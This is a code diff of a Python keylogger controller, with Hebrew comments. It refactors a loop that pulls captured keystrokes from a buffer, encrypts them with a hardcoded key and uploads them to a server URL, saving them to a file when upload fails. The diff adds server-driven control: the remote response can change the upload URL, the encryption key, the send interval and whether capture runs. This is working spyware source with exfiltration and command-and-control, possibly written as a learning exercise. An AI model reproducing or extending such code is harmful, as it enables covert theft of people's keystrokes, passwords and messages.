@@ -7,22 +7,44 @@ from keylogger_service import KeyLogger
 from encryptor import Encryptor
 from network_writer import NetworkWriter
 
-def timer():
-    time.sleep(5)
-
 class Manager:
     def __init__(self):
+        self.time_network = 5
+        self.server_url = "http://127.0.0.1:5000/api/upload"
+        self.status_listen = True
+        self.key_encryptor = "nmrd"
+
         self.machine_name = socket.gethostname()
         self.file_writer = FileWriter()
         self.service = KeyLogger(self.machine_name)
-        self.encryptor = Encryptor()
-        self.network_writer = NetworkWriter()
+        self.encryptor = Encryptor(self.key_encryptor)
+        self.network_writer = NetworkWriter(self.server_url)
 
-    def continue_listening(self):
-        self.service.continue_listen()
+    def timer(self):
+        time.sleep(self.time_network)
 
-    def stop_listening(self):
-        self.service.stop()
+    def stop_and_continue(self):
+        self.service.stop_continue(self.status_listen)
+
+    def handle_response(self, response_data: dict):
+        """
+        מקבל dict מהשרת ומעדכן את השדות שקיימים בו.
+        שדות שלא קיימים ב-response נשארים עם הערך הקודם שלהם.
+        """
+        settings = response_data.get("settings", {})
+        if "time_network" in settings:
+            self.time_network = settings["time_network"]
+
+        if "key_encryptor" in settings:
+            self.key_encryptor = settings["key_encryptor"]
+
+        if "server_url" in settings:
+            self.server_url = settings["server_url"]
+
+        if "status_listen" in settings:
+            self.status_listen = settings["status_listen"]
+        self.stop_and_continue()
+        print(settings, self.status_listen)
 
     def file_write(self, data):
         self.file_writer.send_data(data, self.machine_name)
@@ -44,7 +66,7 @@ class Manager:
         self.service.start()
         while True:
             try:
-                timer()                                                                 # המתנה בין כל שליחה
+                self.timer()                                                                 # המתנה בין כל שליחה
                 data = self.service.get_and_clear_buffer()                              # שלב 1: מושך נתונים מהבאפר של השירות ומנקה אותו
                 print(data)
                 encrypted_data = self.encryptor.encrypt_dict(data)                      # שלב 2: מצפין את הנתונים לפני השליחה
@@ -55,22 +77,8 @@ class Manager:
                     self.file_write(encrypted_data)
                     continue                                                            # ממשיך ללולאה הבאה
                 print("הנתונים נשלחו בהצלחה.")                                           # אם הגעת לכאן, הכל תקין (קוד0 200)
-
-                try:                                                                    # שלב 4: טיפול בתוכן התגובה
-                    response_data = res.json()
-                    status_listen = response_data.get('status_listen')                  # בודק אם נשלח סטטוס הקשבה
-                    if status_listen is not None:
-                        if status_listen == 0:
-                            print("התקבל סטטוס עצירה מהשרת.")
-                            self.stop_listening()
-                        else:
-                            print("התקבל סטטוס המשך מהשרת.")
-                            self.continue_listening()
-                    else:
-                        print("המפתח 'status_listen' לא נמצא בתגובה.")
-
-                except json.JSONDecodeError:
-                    self.file_write(encrypted_data)
+                res_data = res.json()
+                self.handle_response(res_data)
             except Exception as e:
                 print(e)
 
